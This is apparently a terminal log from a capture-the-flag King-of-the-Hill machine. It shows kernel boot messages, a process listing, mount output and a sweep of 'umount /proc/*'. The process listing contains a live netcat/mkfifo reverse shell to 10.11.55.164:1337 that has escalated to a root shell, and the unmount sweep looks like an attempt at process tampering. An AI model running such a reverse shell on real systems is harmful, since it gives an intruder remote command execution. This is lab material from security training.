[    0.765113] pnp 00:02: Plug and Play ACPI device, IDs PNP0b00 (active)
[    0.765149] xen: --> pirq=18 -> irq=12 (gsi=12)
[    0.765165] pnp 00:03: Plug and Play ACPI device, IDs PNP0f13 (active)
[    0.765192] xen: --> pirq=19 -> irq=1 (gsi=1)
[    0.765203] pnp 00:04: Plug and Play ACPI device, IDs PNP0303 PNP030b (active)
[    0.765227] xen: --> pirq=20 -> irq=6 (gsi=6)
[    0.765229] pnp 00:05: [dma 2]
[    0.765244] pnp 00:05: Plug and Play ACPI device, IDs PNP0700 (active)
[    0.765280] xen: --> pirq=21 -> irq=4 (gsi=4)
[    0.765295] pnp 00:06: Plug and Play ACPI device, IDs PNP0501 (active)
[    0.765374] system 00:07: [io  0x10c0-0x1141] has been reserved
[    0.770532] system 00:07: [io  0xb044-0xb047] has been reserved
[    0.775368] system 00:07: Plug and Play ACPI device, IDs PNP0c02 (active)
[    0.784028] random: fast init done
[    0.795935] pnp: PnP ACPI: found 8 devices
[    0.805154] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.814368] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.814370] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.814371] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.814372] pci_bus 0000:00: resource 7 [mem 0xf0000000-0xfbffffff window]
[    0.814607] NET: Registered protocol family 2
[    0.819426] TCP established hash table entries: 8192 (order: 4, 65536 bytes)
[    0.827390] TCP bind hash table entries: 8192 (order: 5, 131072 bytes)
[    0.833876] TCP: Hash tables configured (established 8192 bind 8192)
[    0.838872] UDP hash table entries: 512 (order: 2, 16384 bytes)
[    0.843382] UDP-Lite hash table entries: 512 (order: 2, 16384 bytes)
[    0.848517] NET: Registered protocol family 1
[    0.856646] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.863889] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.869619] pci 0000:00:01.0: Activating ISA DMA hang workarounds
[    0.875913] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.883482] PCI: CLS 0 bytes, default 64
[    0.883534] Unpacking initramfs...
[    1.624604] Freeing initrd memory: 56548K
[    1.640756] Scanning for low memory corruption every 60 seconds
[    1.648180] Initialise system trusted keyrings
[    1.653806] Key type blacklist registered
[    1.656988] workingset: timestamp_bits=36 max_order=18 bucket_order=0
[    1.662971] zbud: loaded
[    1.665788] squashfs: version 4.0 (2009/01/31) Phillip Lougher
[    1.669893] fuse init (API version 7.26)
[    1.673561] Key type asymmetric registered
[    1.676369] Asymmetric key parser 'x509' registered
[    1.679835] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 246)
[    1.686153] io scheduler noop registered
[    1.691080] io scheduler deadline registered
[    1.696810] io scheduler cfq registered (default)
[    1.700320] efifb: probing for efifb
[    1.703829] efifb: framebuffer at 0xf0000000, using 1408k, total 1408k
[    1.709036] efifb: mode is 800x600x24, linelength=2400, pages=1
[    1.713843] efifb: scrolling: redraw
[    1.716583] efifb: Truecolor: size=0:8:8:8, shift=0:16:8:0
[    1.721685] Console: switching to colour frame buffer device 100x37
[    1.738292] fb0: EFI VGA frame buffer device
[    1.743497] intel_idle: Please enable MWAIT in BIOS SETUP
[    1.743691] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    1.748296] ACPI: Power Button [PWRF]
[    1.750729] input: Sleep Button as /devices/LNXSYSTM:00/LNXSLPBN:00/input/input1
[    1.755497] ACPI: Sleep Button [SLPF]
[    1.758675] xen: --> pirq=22 -> irq=28 (gsi=28)
[    1.758933] xen:grant_table: Grant tables using version 1 layout
[    1.765166] Grant table initialized
[    1.767755] Cannot get hvm parameter CONSOLE_EVTCHN (18): -22!
[    1.771503] Serial: 8250/16550 driver, 32 ports, IRQ sharing enabled
[    1.836922] 00:06: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    1.849533] Linux agpgart interface v0.103
[    1.856646] loop: module loaded
[    1.859872] Invalid max_queues (4), will use default max: 1.
[    1.868904] ata_piix 0000:00:01.1: version 2.13
[    1.870056] scsi host0: ata_piix
[    1.872789] scsi host1: ata_piix
[    1.875552] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc100 irq 14
[    1.880724] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc108 irq 15
[    1.888164] libphy: Fixed MDIO Bus: probed
[    1.891261] tun: Universal TUN/TAP device driver, 1.6
[    1.895075] PPP generic driver version 2.4.2
[    1.906461] xen_netfront: Initialising Xen virtual ethernet driver
[    1.932104] ehci_hcd: USB 2.0 'Enhanced' Host Controller (EHCI) Driver
[    1.945229] ehci-pci: EHCI PCI platform driver
[    1.949511] ehci-platform: EHCI generic platform driver
[    1.955302] ohci_hcd: USB 1.1 'Open' Host Controller (OHCI) Driver
[    1.962494] ohci-pci: OHCI PCI platform driver
[    1.968692] ohci-platform: OHCI generic platform driver
[    1.975540] uhci_hcd: USB Universal Host Controller Interface driver
[    1.983426] i8042: PNP: PS/2 Controller [PNP0303:PS2K,PNP0f13:PS2M] at 0x60,0x64 irq 1,12
[    1.998382] serio: i8042 KBD port at 0x60,0x64 irq 1
[    2.005627] serio: i8042 AUX port at 0x60,0x64 irq 12
[    2.012114] mousedev: PS/2 mouse device common for all mice
[    2.022248] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input2
[    2.035407] rtc_cmos 00:02: rtc core: registered rtc_cmos as rtc0
[    2.045879] rtc_cmos 00:02: alarms up to one day, 114 bytes nvram, hpet irqs
[    2.053110] i2c /dev entries driver
[    2.055922] device-mapper: uevent: version 1.0.3
[    2.061545] device-mapper: ioctl: 4.37.0-ioctl (2017-09-20) initialised: dm-devel@redhat.com
[    2.074084] ledtrig-cpu: registered to indicate activity on CPUs
[    2.082147] NET: Registered protocol family 10
[    2.096861] Segment Routing with IPv6
[    2.099973] NET: Registered protocol family 17
[    2.105398] Key type dns_resolver registered
[    2.109595] mce: Using 2 MCE banks
[    2.112811] RAS: Correctable Errors collector initialized.
[    2.122737] sched_clock: Marking stable (2122697408, 0)->(2998905742, -876208334)
[    2.130596] registered taskstats version 1
[    2.133836] Loading compiled-in X.509 certificates
[    2.139111] blkfront: xvda: barrier or flush: disabled; persistent grants: disabled; indirect descriptors: enabled;
[    2.148264] Loaded X.509 cert 'Build time autogenerated kernel key: d019e8c5f4cbc828f6af43369f65a014a3a68371'
[    2.162580] zswap: loaded using pool lzo/zbud
[    2.175577] Key type big_key registered
[    2.180018] Key type trusted registered
[    2.187478]  xvda: xvda1 xvda2
[    2.191551] Key type encrypted registered
[    2.195810] AppArmor: AppArmor sha1 policy hashing enabled
[    2.200534] ima: No TPM chip found, activating TPM-bypass! (rc=-19)
[    2.206548] ima: Allocated hash algorithm: sha1
[    2.226396] evm: HMAC attrs: 0x1
[    2.230738] blkfront: xvdh: barrier or flush: disabled; persistent grants: disabled; indirect descriptors: enabled;
[    2.332112]   Magic number: 3:451:552
[    2.341835] tty ttyS28: hash matches
[    2.345485] clockevents clockevent3: hash matches
[    2.349736] acpi PNP0C0F:03: hash matches
[    2.354705] rtc_cmos 00:02: setting system clock to 2023-12-08 22:31:36 UTC (1702074696)
[    2.364634] BIOS EDD facility v0.16 2004-Jun-25, 0 devices found
[    2.372161] EDD information not available.
[    2.381090] Freeing unused kernel image memory: 2432K
[    2.396056] Write protecting the kernel read-only data: 20480k
[    2.404799] Freeing unused kernel image memory: 2008K
[    2.411090] Freeing unused kernel image memory: 1880K
[    2.422078] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    2.426717] x86/mm: Checking user space page tables
[    2.436754] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    2.463810] random: systemd-udevd: uninitialized urandom read (16 bytes read)
[    2.474558] random: udevadm: uninitialized urandom read (16 bytes read)
[    2.483545] random: systemd-udevd: uninitialized urandom read (16 bytes read)
[    2.656042] tsc: Refined TSC clocksource calibration: 2300.025 MHz
[    2.661332] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x21274d0437c, max_idle_ns: 440795302444 ns
[    2.675444] FDC 0 is a S82078B
[    2.831462] checking generic (f0000000 160000) vs hw (f0000000 2000000)
[    2.831463] fb: switching to cirrusdrmfb from EFI VGA
[    2.845470] AVX2 version of gcm_enc/dec engaged.
[    2.848855] AES CTR mode by8 optimization enabled
[    2.866839] Console: switching to colour dummy device 80x25
[    2.900478] [TTM] Zone  kernel: Available graphics memory: 503412 kiB
[    2.913109] [TTM] Initializing pool allocator
[    2.918419] [TTM] Initializing DMA pool allocator
[    2.925916] [drm] fb mappable at 0xF0000000
[    2.931828] [drm] vram aper at 0xF0000000
[    2.937771] [drm] size 33554432
[    2.942019] [drm] fb depth is 24
[    2.946375] [drm]    pitch is 3072
[    2.951292] fbcon: cirrusdrmfb (fb0) is primary device
[    3.013412] Console: switching to colour frame buffer device 128x48
[    3.032068] cirrus 0000:00:02.0: fb0: cirrusdrmfb frame buffer device
[    3.039164] [drm] Initialized cirrus 1.0.0 20110418 for 0000:00:02.0 on minor 0
[    3.047901] piix4_smbus 0000:00:01.3: SMBus base address uninitialized - upgrade BIOS or use force_addr=0xaddr
[    3.268015] raid6: sse2x1   gen()  5852 MB/s
[    3.323145] raid6: sse2x1   xor()  5021 MB/s
[    3.383252] raid6: sse2x2   gen()  8887 MB/s
[    3.432013] raid6: sse2x2   xor()  5586 MB/s
[    3.480059] raid6: sse2x4   gen()  8241 MB/s
[    3.528064] raid6: sse2x4   xor()  6600 MB/s
[    3.576023] raid6: avx2x1   gen() 11304 MB/s
[    3.624030] raid6: avx2x1   xor()  9634 MB/s
[    3.672013] raid6: avx2x2   gen() 13403 MB/s
[    3.724051] raid6: avx2x2   xor()  9898 MB/s
[    3.780169] raid6: avx2x4   gen() 17487 MB/s
[    3.832010] raid6: avx2x4   xor() 11947 MB/s
[    3.835297] raid6: using algorithm avx2x4 gen() 17487 MB/s
[    3.840063] raid6: .... xor() 11947 MB/s, rmw enabled
[    3.848186] raid6: using avx2x2 recovery algorithm
[    3.854477] xor: automatically using best checksumming function   avx       
[    3.863374] async_tx: api initialized (async)
[    3.940742] Btrfs loaded, crc32c=crc32c-intel
[    4.000335] EXT4-fs (xvda2): mounted filesystem with ordered data mode. Opts: (null)
[    4.262336] ip_tables: (C) 2000-2006 Netfilter Core Team
[    4.275730] systemd[1]: systemd 237 running in system mode. (+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD -IDN2 +IDN -PCRE2 default-hierarchy=hybrid)
[    4.295857] systemd[1]: Detected virtualization xen.
[    4.300149] systemd[1]: Detected architecture x86-64.
[    4.313894] systemd[1]: Set hostname to <foodctf>.
[    4.513732] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input4
[    4.590139] systemd[1]: Created slice User and Session Slice.
[    4.602074] systemd[1]: Reached target Swap.
[    4.609949] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
[    4.621299] systemd[1]: Reached target User and Group Name Lookups.
[    4.630935] systemd[1]: Set up automount Arbitrary Executable File Formats File System Automount Point.
[    4.645702] systemd[1]: Created slice System Slice.
[    4.716040] EXT4-fs (xvda2): re-mounted. Opts: (null)
[    4.878415] Loading iSCSI transport class v2.0-870.
[    4.918480] iscsi: registered transport (tcp)
[    5.031984] iscsi: registered transport (iser)
[    5.251997] systemd-journald[397]: Received request to flush runtime journal from PID 1
[    5.645259] audit: type=1400 audit(1702074699.788:2): apparmor="STATUS" operation="profile_load" profile="unconfined" name="lxc-container-default" pid=491 comm="apparmor_parser"
[    5.645262] audit: type=1400 audit(1702074699.788:3): apparmor="STATUS" operation="profile_load" profile="unconfined" name="lxc-container-default-cgns" pid=491 comm="apparmor_parser"
[    5.645263] audit: type=1400 audit(1702074699.788:4): apparmor="STATUS" operation="profile_load" profile="unconfined" name="lxc-container-default-with-mounting" pid=491 comm="apparmor_parser"
[    5.645265] audit: type=1400 audit(1702074699.788:5): apparmor="STATUS" operation="profile_load" profile="unconfined" name="lxc-container-default-with-nesting" pid=491 comm="apparmor_parser"
[    5.677599] audit: type=1400 audit(1702074699.820:6): apparmor="STATUS" operation="profile_load" profile="unconfined" name="/sbin/dhclient" pid=494 comm="apparmor_parser"
[    5.677602] audit: type=1400 audit(1702074699.820:7): apparmor="STATUS" operation="profile_load" profile="unconfined" name="/usr/lib/NetworkManager/nm-dhcp-client.action" pid=494 comm="apparmor_parser"
[    5.677604] audit: type=1400 audit(1702074699.820:8): apparmor="STATUS" operation="profile_load" profile="unconfined" name="/usr/lib/NetworkManager/nm-dhcp-helper" pid=494 comm="apparmor_parser"
[    5.677605] audit: type=1400 audit(1702074699.820:9): apparmor="STATUS" operation="profile_load" profile="unconfined" name="/usr/lib/connman/scripts/dhclient-script" pid=494 comm="apparmor_parser"
[    5.687048] audit: type=1400 audit(1702074699.828:10): apparmor="STATUS" operation="profile_load" profile="unconfined" name="/usr/bin/lxc-start" pid=496 comm="apparmor_parser"
[    5.696891] audit: type=1400 audit(1702074699.840:11): apparmor="STATUS" operation="profile_load" profile="unconfined" name="/usr/bin/man" pid=497 comm="apparmor_parser"
[    6.561948] RAPL PMU: API unit is 2^-32 Joules, 3 fixed counters, 655360 ms ovfl timer
[    6.561949] RAPL PMU: hw unit of domain pp0-core 2^-14 Joules
[    6.561950] RAPL PMU: hw unit of domain package 2^-14 Joules
[    6.561950] RAPL PMU: hw unit of domain dram 2^-16 Joules
[    6.599251] EDAC sbridge: Seeking for: PCI ID 8086:6fa0
[    6.599255] EDAC sbridge:  Ver: 1.1.2 
[   20.098694] new mount options do not match the existing superblock, will be ignored
[   23.305090] random: crng init done
[   23.305092] random: 7 urandom warning(s) missed due to ratelimiting
ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         5  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/u30:0]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       255  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:3]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1589  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:3]
root      1590  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:4]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      1647  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/0:0]
root         1  0.3  0.8 159864  9012 ?        Ss   22:31   0:05 /sbin/init maybe-ubiquity
root       397  0.0  1.6 127576 16696 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.0  0.4  45560  4512 ?        Ss   22:31   0:01 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6228 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  18532  3236 ?        S    23:00   0:00      |   \_ -i
root      1923  0.0  0.3  37080  3376 ?        R    23:01   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.3 106640  3656 ?        Ssl  22:31   0:00 /root/koth
root       791  0.0  0.3  30028  3100 ?        Ss   22:31   0:00 /usr/sbin/cron -f
root       792  0.3  2.4 557680 24952 ?        Ssl  22:31   0:06 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
mysql      841  0.1 17.5 1161928 176800 ?      Sl   22:32   0:02 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1362  0.1  1.5 723964 15904 ?        Ssl  22:35   0:01 /usr/bin/systemd-pam
root      1575  4.7  0.0   1000    56 ?        Ss   23:00   0:01 /li
mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=471976k,nr_inodes=117994,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=100684k,mode=755)
/dev/xvda2 on / type ext4 (rw,relatime,data=ordered)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=26,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=14822)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
mqueue on /dev/mqueue type mqueue (rw,relatime)
fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
configfs on /sys/kernel/config type configfs (rw,relatime)
/var/lib/snapd/snaps/core_7270.snap on /snap/core/7270 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/core_8689.snap on /snap/core/8689 type squashfs (ro,nodev,relatime,x-gdu.hide)
lxcfs on /var/lib/lxcfs type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
tmpfs on /run/user/1003 type tmpfs (rw,nosuid,nodev,relatime,size=100680k,mode=700,uid=1003,gid=1003)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
tracefs on /sys/kernel/debug/tracing type tracefs (rw,relatime)
umount /proc/*
umount: /proc/1: not mounted.
umount: /proc/10: not mounted.
umount: /proc/100: not mounted.
umount: /proc/11: not mounted.
umount: /proc/117: not mounted.
umount: /proc/12: not mounted.
umount: /proc/13: not mounted.
umount: /proc/1362: not mounted.
umount: /proc/14: not mounted.
umount: /proc/1425: not mounted.
umount: /proc/15: not mounted.
umount: /proc/1544: not mounted.
umount: /proc/1549: not mounted.
umount: /proc/1556: not mounted.
umount: /proc/1557: not mounted.
umount: /proc/1558: not mounted.
umount: /proc/1563: not mounted.
umount: /proc/1575: not mounted.
umount: /proc/1589: not mounted.
umount: /proc/1590: not mounted.
umount: /proc/1591: not mounted.
umount: /proc/16: not mounted.
umount: /proc/1647: not mounted.
umount: /proc/167: not mounted.
umount: /proc/17: not mounted.
umount: /proc/18: not mounted.
umount: /proc/19: not mounted.
umount: /proc/2: not mounted.
umount: /proc/20: not mounted.
umount: /proc/21: not mounted.
umount: /proc/22: not mounted.
umount: /proc/23: not mounted.
umount: /proc/24: not mounted.
umount: /proc/25: not mounted.
umount: /proc/255: not mounted.
umount: /proc/26: not mounted.
umount: /proc/263: not mounted.
umount: /proc/27: not mounted.
umount: /proc/28: not mounted.
umount: /proc/29: not mounted.
umount: /proc/30: not mounted.
umount: /proc/31: not mounted.
umount: /proc/316: not mounted.
umount: /proc/317: not mounted.
umount: /proc/32: not mounted.
umount: /proc/33: not mounted.
umount: /proc/36: not mounted.
umount: /proc/367: not mounted.
umount: /proc/37: not mounted.
umount: /proc/38: not mounted.
umount: /proc/397: not mounted.
umount: /proc/399: not mounted.
umount: /proc/4: not mounted.
umount: /proc/402: not mounted.
umount: /proc/403: not mounted.
umount: /proc/404: not mounted.
umount: /proc/405: not mounted.
umount: /proc/406: not mounted.
umount: /proc/408: not mounted.
umount: /proc/417: not mounted.
umount: /proc/419: not mounted.
umount: /proc/421: not mounted.
umount: /proc/5: not mounted.
umount: /proc/508: not mounted.
umount: /proc/6: not mounted.
umount: /proc/610: not mounted.
umount: /proc/623: not mounted.
umount: /proc/7: not mounted.
umount: /proc/729: not mounted.
umount: /proc/743: not mounted.
umount: /proc/745: not mounted.
umount: /proc/747: not mounted.
umount: /proc/751: not mounted.
umount: /proc/753: not mounted.
umount: /proc/755: not mounted.
umount: /proc/756: not mounted.
umount: /proc/763: not mounted.
umount: /proc/788: not mounted.
umount: /proc/789: not mounted.
umount: /proc/791: not mounted.
umount: /proc/792: not mounted.
umount: /proc/8: not mounted.
umount: /proc/80: not mounted.
umount: /proc/800: not mounted.
umount: /proc/809: not mounted.
umount: /proc/81: not mounted.
umount: /proc/815: not mounted.
umount: /proc/816: not mounted.
umount: /proc/819: not mounted.
umount: /proc/82: not mounted.
umount: /proc/83: not mounted.
umount: /proc/84: not mounted.
umount: /proc/841: not mounted.
umount: /proc/85: not mounted.
umount: /proc/9: not mounted.
umount: /proc/91: not mounted.
umount: /proc/956: not mounted.
umount: /proc/966: not mounted.
umount: /proc/acpi: not mounted.
umount: /proc/buddyinfo: not mounted.
umount: /proc/bus: not mounted.
umount: /proc/cgroups: not mounted.
